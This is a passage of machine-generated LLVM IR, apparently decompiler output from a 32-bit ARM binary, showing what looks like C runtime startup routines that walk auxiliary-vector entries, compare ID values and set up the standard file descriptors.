  uselistorder i32 ()* @unknown_0, { 4, 3, 2, 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_12568() local_unnamed_addr {
dec_label_pc_1258c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12568 = load i32, i32* @r4, align 4
  store i32 %v3_12568, i32* %stack_var_-16, align 4
  store i32 142956, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %dec_label_pc_1258c.dec_label_pc_1258c_crit_edge, %dec_label_pc_1258c.lr.ph
  %v1_1258c = phi i32 [ %v1_12598, %dec_label_pc_1258c.dec_label_pc_1258c_crit_edge ], [ 0, %dec_label_pc_1258c.lr.ph ]
  %v0_1258c = phi i32 [ %v0_1258c.pre, %dec_label_pc_1258c.dec_label_pc_1258c_crit_edge ], [ 142956, %dec_label_pc_1258c.lr.ph ]
  %v4_1258c = mul i32 %v1_1258c, 4
  %v5_1258c = add i32 %v4_1258c, %v0_1258c
  %v6_1258c = inttoptr i32 %v5_1258c to i32*
  %v7_1258c = load i32, i32* %v6_1258c, align 4
  call void @__pseudo_branch(i32 %v7_1258c)
  %v0_12598 = load i32, i32* %r4.global-to-local, align 4
  %v1_12598 = add i32 %v0_12598, -1
  store i32 %v1_12598, i32* %r4.global-to-local, align 4
  %v2_12598 = icmp eq i32 %v0_12598, 0
  br i1 %v2_12598, label %dec_label_pc_125a0, label %dec_label_pc_1258c.dec_label_pc_1258c_crit_edge

dec_label_pc_1258c.dec_label_pc_1258c_crit_edge:  ; preds = %dec_label_pc_1258c
  %v0_1258c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1258c

dec_label_pc_125a0:                               ; preds = %dec_label_pc_1258c
  %v4_125a4 = load i32, i32* @global_var_25864.539, align 4
  %v2_125a8 = icmp eq i32 %v4_125a4, 0
  br i1 %v2_125a8, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_125a0
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_125a0, %bb
  %v2_125b0 = xor i1 %v2_125a8, true
  call void @__pseudo_cond_branch(i1 %v2_125b0, i32 %v4_125a4)
  %v4_125b8 = load i32, i32* @global_var_25868.541, align 4
  %v2_125bc = icmp eq i32 %v4_125b8, 0
  br i1 %v2_125bc, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_125c4 = xor i1 %v2_125bc, true
  call void @__pseudo_cond_branch(i1 %v2_125c4, i32 %v4_125b8)
  %v2_125c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_125c8, i32* %r4.global-to-local, align 4
  %v1_125cc = load i32, i32* @r0, align 4
  ret i32 %v1_125cc

; uselistorder directives
  uselistorder i32 %v1_12598, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_125e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_125e4:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_125f8 = call i32 @function_12d0c(i32 %arg1, i32 1)
  %v3_12600 = icmp eq i32 %v2_125f8, -1
  store i32 142964, i32* @r3, align 4
  br i1 %v3_12600, label %dec_label_pc_1260c, label %dec_label_pc_12624

dec_label_pc_1260c:                               ; preds = %dec_label_pc_125e4
  %v0_12610 = load i32, i32* %r5.global-to-local, align 4
  %v3_12618 = call i32 @function_12b5c(i32 ptrtoint ([10 x i8]* @global_var_1a734.544 to i32), i32 %v0_12610)
  %v1_1261c = load i32, i32* %r4.global-to-local, align 4
  %v1_12620 = icmp ne i32 %v3_12618, %v1_1261c
  call void @__pseudo_cond_branch(i1 %v1_12620, i32 ptrtoint (i32* @global_var_112c4.545 to i32))
  br label %dec_label_pc_12624

dec_label_pc_12624:                               ; preds = %dec_label_pc_125e4, %dec_label_pc_1260c
  %v1_1262c = phi i32 [ %v2_125f8, %dec_label_pc_125e4 ], [ %v3_12618, %dec_label_pc_1260c ]
  ret i32 %v1_1262c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_12624, { 1, 0 }
}

define i32 @function_12638(i32 %arg1) local_unnamed_addr {
dec_label_pc_12638:
  %r4.global-to-local = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10828.547 to i32), i32 75340), i32* %r4.global-to-local, align 4
  %v4_12648 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10828.547 to i32), i32 75436) to i32*), align 4
  %v1_1264c = inttoptr i32 %v4_12648 to i32*
  %v2_1264c = load i32, i32* %v1_1264c, align 4
  %v2_12650 = icmp eq i32 %v2_1264c, 0
  br i1 %v2_12650, label %dec_label_pc_12658, label %dec_label_pc_1268c

dec_label_pc_12658:                               ; preds = %dec_label_pc_12638
  %v4_1265c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10828.547 to i32), i32 75396) to i32*), align 4
  %v2_12664 = icmp eq i32 %v4_1265c, 0
  store i32 4096, i32* %v1_1264c, align 4
  br i1 %v2_12664, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_12658
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_12658, %bb
  %v2_12670 = xor i1 %v2_12664, true
  call void @__pseudo_cond_branch(i1 %v2_12670, i32 %v4_1265c)
  %v0_12678 = load i32, i32* %r4.global-to-local, align 4
  %v2_12680 = icmp eq i32 %v0_12678, 86920
  br i1 %v2_12680, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_12688 = xor i1 %v2_12680, true
  call void @__pseudo_cond_branch(i1 %v2_12688, i32 ptrtoint (i32* @global_var_daec.551 to i32))
  br label %dec_label_pc_1268c

dec_label_pc_1268c:                               ; preds = %dec_label_pc_12638, %bb6
  %v1_12690 = load i32, i32* @r0, align 4
  ret i32 %v1_12690

; uselistorder directives
  uselistorder i1 %v2_12680, { 1, 0 }
  uselistorder label %dec_label_pc_1268c, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_126a4(i32 %arg1, i32 %arg2, i16* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_126a4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v2_126ac = add i32 %tmp, 4
  store i32 %v2_126ac, i32* %ip.global-to-local, align 4
  %tmp57 = bitcast i16* %arg3 to i32*
  %v3_126b0 = load i32, i32* %tmp57, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 142964, i32* @r6, align 4
  %v3_126bc = mul i32 %arg2, 4
  store i32 %v3_126bc, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_126c4 = load i32, i32* inttoptr (i32 142984 to i32*), align 8
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_126cc = ptrtoint i32* %stack_var_-120 to i32
  %v4_126d0 = load i32, i32* inttoptr (i32 142992 to i32*), align 16
  store i32 %v4_126d0, i32* %r4.global-to-local, align 4
  %v2_126d8 = add i32 %v2_126ac, %v3_126bc
  store i32 %v2_126d8, i32* %ip.global-to-local, align 4
  %v9_126dc = icmp eq i32 %v2_126d8, %v3_126b0
  store i1 %v9_126dc, i1* %cpsr_z.global-to-local, align 1
  %v2_126e0 = inttoptr i32 %v4_126c4 to i32*
  store i32 %arg7, i32* %v2_126e0, align 4
  store i32 10740, i32* %r2.global-to-local, align 4
  %v0_126ec = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_126dc, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_126a4
  %v1_126f0 = load i32, i32* @r7, align 4
  %v2_126f0 = load i32, i32* %r5.global-to-local, align 4
  %v3_126f0 = add i32 %v2_126f0, %v1_126f0
  store i32 %v3_126f0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_25868.541, align 4
  %v0_126f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_126f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_126f8 = inttoptr i32 %v1_126f8 to i32*
  store i32 %v0_126f8, i32* %v2_126f8, align 4
  store i32 120, i32* @r2, align 4
  %v1_12704 = load i32, i32* %r3.global-to-local, align 4
  %v2_12704 = load i32, i32* %r4.global-to-local, align 4
  %v3_12704 = inttoptr i32 %v2_12704 to i32*
  store i32 %v1_12704, i32* %v3_12704, align 4
  br label %bb58

.critedge:                                        ; preds = %dec_label_pc_126a4
  store i32 %arg6, i32* @global_var_25868.541, align 4
  %v0_126f8.c = load i32, i32* %ip.global-to-local, align 4
  %v1_126f8.c = load i32, i32* %r4.global-to-local, align 4
  %v2_126f8.c = inttoptr i32 %v1_126f8.c to i32*
  store i32 %v0_126f8.c, i32* %v2_126f8.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  store i32 %v2_126cc, i32* %r0.global-to-local, align 4
  %v2_12710 = bitcast i32* %stack_var_-120 to i8*
  %v3_12710 = call i32 @function_f5d0(i8* %v2_12710, i32 0)
  store i32 %v3_12710, i32* %r0.global-to-local, align 4
  %v0_12714 = load i32, i32* %r4.global-to-local, align 4
  %v1_12714 = inttoptr i32 %v0_12714 to i32*
  %storemerge.pre = load i32, i32* %v1_12714, align 4
  br label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_12720, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_12720, %dec_label_pc_12720 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_12720 = inttoptr i32 %storemerge to i32*
  %v2_12720 = load i32, i32* %v1_12720, align 4
  store i32 %v2_12720, i32* %r3.global-to-local, align 4
  %v4_12720 = add i32 %storemerge, 4
  store i32 %v4_12720, i32* %r2.global-to-local, align 4
  %v2_12724 = icmp eq i32 %v2_12720, 0
  br i1 %v2_12724, label %dec_label_pc_12730, label %dec_label_pc_12720

dec_label_pc_12730:                               ; preds = %dec_label_pc_12720
  store i32 %v4_12720, i32* @r4, align 4
  store i32 %v2_126cc, i32* @r5, align 4
  %v1_1275429 = inttoptr i32 %v4_12720 to i32*
  %v2_1275430 = load i32, i32* %v1_1275429, align 4
  store i32 %v2_1275430, i32* %r3.global-to-local, align 4
  %v2_1275832 = icmp eq i32 %v2_1275430, 0
  store i1 %v2_1275832, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1275832, label %dec_label_pc_12760, label %dec_label_pc_1273c

dec_label_pc_1273c:                               ; preds = %dec_label_pc_12730, %dec_label_pc_12754
  %v5_12740 = phi i32 [ %v2_12754, %dec_label_pc_12754 ], [ %v2_1275430, %dec_label_pc_12730 ]
  %v2_1273c = icmp ugt i32 %v5_12740, 13
  %v7_1273c = icmp eq i32 %v5_12740, 14
  store i1 %v7_1273c, i1* %cpsr_z.global-to-local, align 1
  %v2_12740 = xor i1 %v2_1273c, true
  %v3_12740 = or i1 %v7_1273c, %v2_12740
  br i1 %v3_12740, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_1273c
  %v4_12740 = load i32, i32* @r5, align 4
  %v6_12740 = and i32 %v5_12740, 536870912
  %v7_12740 = icmp ne i32 %v6_12740, 0
  %v8_12740 = mul i32 %v5_12740, 8
  %v9_12740 = add i32 %v4_12740, %v8_12740
  store i32 %v9_12740, i32* %r0.global-to-local, align 4
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_1273c, %bb59
  %v1_1274c = phi i1 [ %v2_1273c, %dec_label_pc_1273c ], [ %v7_12740, %bb59 ]
  %v2_12744 = xor i1 %v1_1274c, true
  %v3_12744 = or i1 %v7_1273c, %v2_12744
  br i1 %v3_12744, label %bb61, label %dec_label_pc_12754

bb61:                                             ; preds = %bb60
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12754

dec_label_pc_12754:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_12744, i32 ptrtoint (i32* @global_var_f700.405 to i32))
  %v0_12750 = load i32, i32* @r4, align 4
  %v1_12750 = add i32 %v0_12750, 8
  store i32 %v1_12750, i32* @r4, align 4
  %v1_12754 = inttoptr i32 %v1_12750 to i32*
  %v2_12754 = load i32, i32* %v1_12754, align 4
  store i32 %v2_12754, i32* %r3.global-to-local, align 4
  %v2_12758 = icmp eq i32 %v2_12754, 0
  store i1 %v2_12758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12758, label %dec_label_pc_12760, label %dec_label_pc_1273c

dec_label_pc_12760:                               ; preds = %dec_label_pc_12754, %dec_label_pc_12730
  store i32 %v2_126cc, i32* %r0.global-to-local, align 4
  %v1_12764 = call i32 @function_15674(i32 %v2_126cc)
  store i32 %v1_12764, i32* @r0, align 4
  %v1_12768 = call i32 @function_12638(i32 %v1_12764)
  store i32 %v1_12768, i32* @r0, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_12774 = load i32, i32* @r6, align 4
  %v2_12774 = add i32 %v0_12774, 96
  %v3_12774 = inttoptr i32 %v2_12774 to i32*
  %v4_12774 = load i32, i32* %v3_12774, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_1277c = icmp eq i32 %tmp53, 0
  store i1 %v2_1277c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1277c, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_12760
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_12760, %bb62
  %v0_12788 = phi i32 [ %tmp53, %dec_label_pc_12760 ], [ 4096, %bb62 ]
  %v3_12784 = icmp eq i32 %tmp52, -1
  %v8_12784 = icmp eq i32 %tmp52, -1
  store i1 %v8_12784, i1* %cpsr_z.global-to-local, align 1
  %v2_12788 = inttoptr i32 %v4_12774 to i32*
  store i32 %v0_12788, i32* %v2_12788, align 4
  br i1 %v3_12784, label %dec_label_pc_12790, label %dec_label_pc_127b8

dec_label_pc_12790:                               ; preds = %bb63
  %v0_12790 = call i32 @function_12bf0()
  store i32 %v0_12790, i32* @r0, align 4
  store i32 %v0_12790, i32* @r4, align 4
  %v0_12798 = call i32 @function_12c4c()
  store i32 %v0_12798, i32* @r0, align 4
  %v0_1279c = load i32, i32* @r4, align 4
  %v9_1279c = icmp eq i32 %v0_1279c, %v0_12798
  store i1 %v9_1279c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1279c, label %dec_label_pc_127a4, label %dec_label_pc_127e0

dec_label_pc_127a4:                               ; preds = %dec_label_pc_12790
  %v1_127a4 = call i32 @function_12ccc(i32 %v0_12798)
  store i32 %v1_127a4, i32* @r0, align 4
  store i32 %v1_127a4, i32* @r4, align 4
  %v0_127ac = call i32 @function_12c38()
  store i32 %v0_127ac, i32* @r0, align 4
  %v0_127b0 = load i32, i32* @r4, align 4
  %v9_127b0 = icmp eq i32 %v0_127b0, %v0_127ac
  store i1 %v9_127b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_127b0, label %dec_label_pc_127b8, label %dec_label_pc_127e0

dec_label_pc_127b8:                               ; preds = %dec_label_pc_127a4, %bb63
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_12784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12784, label %dec_label_pc_12804, label %dec_label_pc_127c4

dec_label_pc_127c4:                               ; preds = %dec_label_pc_127b8
  store i32 %tmp51, i32* @r3, align 4
  %v9_127c8 = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_127c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_127c8, label %dec_label_pc_127d0, label %dec_label_pc_127e0

dec_label_pc_127d0:                               ; preds = %dec_label_pc_127c4
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_127d8 = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_127d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_127d8, label %dec_label_pc_12804, label %dec_label_pc_127e0

dec_label_pc_127e0:                               ; preds = %dec_label_pc_127c4, %dec_label_pc_127a4, %dec_label_pc_12790, %dec_label_pc_127d0
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_127e8 = call i32 @function_125e4(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_127f4 = call i32 @function_125e4(i32 1, i32 32770)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_12800 = call i32 @function_125e4(i32 2, i32 32770)
  store i32 %v2_12800, i32* @r0, align 4
  br label %dec_label_pc_12804

dec_label_pc_12804:                               ; preds = %dec_label_pc_127d0, %dec_label_pc_127b8, %dec_label_pc_127e0
  %v0_12804 = load i32, i32* @r7, align 4
  %v1_12804 = inttoptr i32 %v0_12804 to i32*
  %v2_12804 = load i32, i32* %v1_12804, align 4
  store i32 %v2_12804, i32* %r2.global-to-local, align 4
  store i32 904, i32* %r3.global-to-local, align 4
  %v1_1280c = load i32, i32* @r6, align 4
  %v3_1280c = add i32 %v1_1280c, 904
  %v4_1280c = inttoptr i32 %v3_1280c to i32*
  store i32 %v2_12804, i32* %v4_1280c, align 4
  %v0_12810 = load i32, i32* @r7, align 4
  %v1_12810 = inttoptr i32 %v0_12810 to i32*
  %v2_12810 = load i32, i32* %v1_12810, align 4
  store i32 %v2_12810, i32* @r4, align 4
  %v2_12814 = icmp eq i32 %v2_12810, 0
  store i1 %v2_12814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12814, label %dec_label_pc_128b8.lr.ph, label %dec_label_pc_1281c

dec_label_pc_1281c:                               ; preds = %dec_label_pc_12804
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_12820 = load i32, i32* @r6, align 4
  %v2_12820 = add i32 %v0_12820, 116
  %v3_12820 = inttoptr i32 %v2_12820 to i32*
  %v4_12820 = load i32, i32* %v3_12820, align 4
  store i32 %v4_12820, i32* %r3.global-to-local, align 4
  %v2_12824 = inttoptr i32 %v4_12820 to i32*
  store i32 %v2_12810, i32* %v2_12824, align 4
  %v0_1282c = load i32, i32* @r7, align 4
  %v1_1282c = inttoptr i32 %v0_1282c to i32*
  %v2_1282c = load i32, i32* %v1_1282c, align 4
  store i32 %v2_1282c, i32* %r0.global-to-local, align 4
  %v4_12830 = call i32 @function_14f18(i32 %v2_1282c, i32 47, i32 %v2_12804, i32 %v4_12820)
  store i32 %v4_12830, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_12838 = icmp eq i32 %v4_12830, 0
  store i1 %v2_12838, i1* %cpsr_z.global-to-local, align 1
  %v0_1283c = load i32, i32* @r6, align 4
  %v2_1283c = add i32 %v0_1283c, 64
  %v3_1283c = inttoptr i32 %v2_1283c to i32*
  %v4_1283c = load i32, i32* %v3_1283c, align 4
  store i32 %v4_1283c, i32* %r2.global-to-local, align 4
  br i1 %v2_12838, label %.thread46, label %bb64

.thread46:                                        ; preds = %dec_label_pc_1281c
  %v2_1284447 = inttoptr i32 %v4_1283c to i32*
  store i32 0, i32* %v2_1284447, align 4
  br label %dec_label_pc_128b8.lr.ph

bb64:                                             ; preds = %dec_label_pc_1281c
  %v2_12840 = add i32 %v4_12830, 1
  store i32 %v2_12840, i32* %r3.global-to-local, align 4
  %v2_12844 = inttoptr i32 %v4_1283c to i32*
  store i32 %v4_12830, i32* %v2_12844, align 4
  %v1_12848 = load i32, i32* %r3.global-to-local, align 4
  %v2_12848 = load i32, i32* %r2.global-to-local, align 4
  %v3_12848 = inttoptr i32 %v2_12848 to i32*
  store i32 %v1_12848, i32* %v3_12848, align 4
  br label %dec_label_pc_128b8.lr.ph

dec_label_pc_128b8.lr.ph:                         ; preds = %.thread46, %bb64, %dec_label_pc_12804
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_12860 = load i32, i32* @r6, align 4
  %v2_12860 = add i32 %v0_12860, -12
  store i32 %v2_12860, i32* %r8.global-to-local, align 4
  store i32 10736, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_25864.539, align 4
  %v2_12890 = icmp eq i32 %v0_126ec, 0
  store i1 %v2_12890, i1* %cpsr_z.global-to-local, align 1
  %v2_12898 = xor i1 %v2_12890, true
  call void @__pseudo_cond_branch(i1 %v2_12898, i32 %v0_126ec)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_128ac = load i32, i32* @r6, align 4
  %v2_128ac = add i32 %v0_128ac, -12
  store i32 %v2_128ac, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_128b8

dec_label_pc_128b8:                               ; preds = %dec_label_pc_128b8.dec_label_pc_128b8_crit_edge, %dec_label_pc_128b8.lr.ph
  %v1_128b8 = phi i32 [ %v1_128c4, %dec_label_pc_128b8.dec_label_pc_128b8_crit_edge ], [ 0, %dec_label_pc_128b8.lr.ph ]
  %v0_128b8 = phi i32 [ %v0_128b8.pre, %dec_label_pc_128b8.dec_label_pc_128b8_crit_edge ], [ %v2_128ac, %dec_label_pc_128b8.lr.ph ]
  %v4_128b8 = mul i32 %v1_128b8, 4
  %v5_128b8 = add i32 %v4_128b8, %v0_128b8
  %v6_128b8 = inttoptr i32 %v5_128b8 to i32*
  %v7_128b8 = load i32, i32* %v6_128b8, align 4
  store i32 %v7_128b8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_128b8)
  %v0_128c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_128c4 = add i32 %v0_128c4, 1
  store i32 %v1_128c4, i32* %r4.global-to-local, align 4
  %v1_128c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_128c8 = icmp ult i32 %v1_128c4, %v1_128c8
  %v9_128c8 = icmp eq i32 %v1_128c4, %v1_128c8
  store i1 %v9_128c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_128c8, label %dec_label_pc_128b8.dec_label_pc_128b8_crit_edge, label %dec_label_pc_128d0

dec_label_pc_128b8.dec_label_pc_128b8_crit_edge:  ; preds = %dec_label_pc_128b8
  %v0_128b8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_128b8

dec_label_pc_128d0:                               ; preds = %dec_label_pc_128b8
  %v0_128d4.pre = load i32, i32* @r6, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_128d4 = add i32 %v0_128d4.pre, 108
  %v3_128d4 = inttoptr i32 %v2_128d4 to i32*
  %v4_128d4 = load i32, i32* %v3_128d4, align 4
  store i32 %v4_128d4, i32* %r2.global-to-local, align 4
  store i32 %v4_128d4, i32* %r3.global-to-local, align 4
  %v2_128dc = icmp eq i32 %v4_128d4, 0
  store i1 %v2_128dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_128dc, label %dec_label_pc_128f4, label %dec_label_pc_128e4

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128d0
  call void @__pseudo_branch(i32 %v4_128d4)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_128f0 = load i32, i32* @r0, align 4
  %v2_128f0 = inttoptr i32 %v1_128f0 to i32*
  store i32 0, i32* %v2_128f0, align 4
  %v0_128f8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_128f4

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128d0, %dec_label_pc_128e4
  %v0_128f8 = phi i32 [ %v0_128d4.pre, %dec_label_pc_128d0 ], [ %v0_128f8.pre, %dec_label_pc_128e4 ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_128f8 = add i32 %v0_128f8, 84
  %v3_128f8 = inttoptr i32 %v2_128f8 to i32*
  %v4_128f8 = load i32, i32* %v3_128f8, align 4
  store i32 %v4_128f8, i32* %r2.global-to-local, align 4
  store i32 %v4_128f8, i32* %r3.global-to-local, align 4
  %v2_12900 = icmp eq i32 %v4_128f8, 0
  store i1 %v2_12900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12900, label %dec_label_pc_12918, label %dec_label_pc_12908

dec_label_pc_12908:                               ; preds = %dec_label_pc_128f4
  call void @__pseudo_branch(i32 %v4_128f8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12914 = load i32, i32* @r0, align 4
  %v2_12914 = inttoptr i32 %v1_12914 to i32*
  store i32 0, i32* %v2_12914, align 4
  %v0_1291c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12918

dec_label_pc_12918:                               ; preds = %dec_label_pc_128f4, %dec_label_pc_12908
  %v0_1291c = phi i32 [ %v0_128f8, %dec_label_pc_128f4 ], [ %v0_1291c.pre, %dec_label_pc_12908 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_1291c = add i32 %v0_1291c, 28
  %v3_1291c = inttoptr i32 %v2_1291c to i32*
  %v4_1291c = load i32, i32* %v3_1291c, align 4
  store i32 %v4_1291c, i32* %r3.global-to-local, align 4
  %v1_12924 = inttoptr i32 %v4_1291c to i32*
  %v2_12924 = load i32, i32* %v1_12924, align 4
  store i32 %v2_12924, i32* %r2.global-to-local, align 4
  %v0_12928 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12928, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_12934 = call i32 @function_11bf0(i32 %v0_12928)
  store i32 %v1_12934, i32* %r0.global-to-local, align 4
  %v0_12938 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12938, label %bb65, label %.thread8

bb65:                                             ; preds = %dec_label_pc_12918
  %v2_12938 = trunc i32 %v1_12934 to i16
  %v3_12938 = load i32, i32* @r1, align 4
  %v4_12938 = inttoptr i32 %v3_12938 to i16*
  store i16 %v2_12938, i16* %v4_12938, align 2
  %v5_12938 = load i32, i32* %r4.global-to-local, align 4
  %v1_1293c = load i32, i32* %r0.global-to-local, align 4
  %v8_1293c = shl i32 %v5_12938, %v1_1293c
  %v9_1293c = and i32 %v8_1293c, %v1_1293c
  %v2_12940 = load i32, i32* %ip.global-to-local, align 4
  %v8_12940 = shl i32 %v2_12940, %v9_1293c
  %v9_12940 = and i32 %v8_12940, %v9_1293c
  store i32 %v9_12940, i32* %r0.global-to-local, align 4
  %v1_12944 = load i32, i32* @r2, align 4
  %v4_12944 = inttoptr i32 %v9_12940 to i32*
  store i32 %v1_12944, i32* %v4_12944, align 4
  %v5_12944 = load i32, i32* %r4.global-to-local, align 4
  %v6_12944 = load i32, i32* %r0.global-to-local, align 4
  %v7_12944 = sub i32 %v6_12944, %v5_12944
  %v2_1294c = load i32, i32* @r2, align 4
  %v3_1294c = and i32 %v2_1294c, %v7_12944
  store i32 %v3_1294c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12918, %bb65
  %v4_12958 = phi i32 [ %v1_12934, %dec_label_pc_12918 ], [ 0, %bb65 ]
  ret i32 %v4_12958

; uselistorder directives
  uselistorder i32 %v0_128d4.pre, { 1, 0 }
  uselistorder i32 %v1_128c8, { 1, 0 }
  uselistorder i32 %v1_128c4, { 3, 2, 1, 0 }
  uselistorder i32 %v4_1283c, { 1, 0, 2 }
  uselistorder i1 %v8_12784, { 1, 2, 0 }
  uselistorder i32 %v2_12754, { 1, 2, 0 }
  uselistorder i1 %v2_1273c, { 1, 0 }
  uselistorder i32 %v5_12740, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12720, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_126ec, { 1, 0 }
  uselistorder i32 %v2_126cc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_126bc, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 7, 6, 8, 9, 10 }
